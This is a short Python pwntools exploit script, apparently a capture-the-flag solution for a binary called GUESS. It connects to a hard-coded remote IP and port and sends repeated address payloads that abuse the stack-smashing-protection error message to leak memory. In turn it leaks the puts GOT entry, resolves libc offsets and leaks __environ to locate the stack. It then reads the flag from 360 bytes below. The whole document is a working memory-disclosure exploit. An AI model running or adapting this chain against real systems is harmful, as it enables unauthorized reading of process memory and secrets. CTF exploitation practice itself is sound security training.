from pwn import *
from LibcSearcher import LibcSearcher

# p = process("./GUESS")
p = remote("106.75.90.160" , 9999)
elf = ELF("./GUESS")
# context.log_level = "debug"
p.recv()


test_addr = elf.got["puts"]
print hex(test_addr)
payload = p64(test_addr) * (0x130 / 8)

p.sendline(payload)

p.recvuntil("***: ")
puts_addr = p.recvuntil("\x7f")
puts_addr += (8 - len(puts_addr)) * "\x00"
puts_addr = u64(puts_addr)
libc = LibcSearcher("puts" , puts_addr)
offset_environ = libc.dump("__environ")
offset_puts = libc.dump("puts")
environ_addr = puts_addr - offset_puts + offset_environ

print "%s:%s" % ("environ" , hex(environ_addr)) 
payload = p64(environ_addr) * (0x130 / 8)
p.recv()
p.sendline(payload)

p.recvuntil("***: ")
content_addr = p.recvuntil("\x7f")
content_addr += (8 - len(content_addr)) * "\x00"
content_addr = u64(content_addr)
print hex(content_addr)
print "____"
# environ -> content_addr
# content_addr on stack , distance content_addr flag_addr 360byte
flag_addr = content_addr - 360
# gdb.attach(p , "b *0x0000000000400B9C ")
p.recv()
payload = p64(flag_addr) * (0x130 / 8)
p.sendline(payload)

# p.recvuntil("***: ")

# print hex(u64(p.recv(8)))
print p.interactive()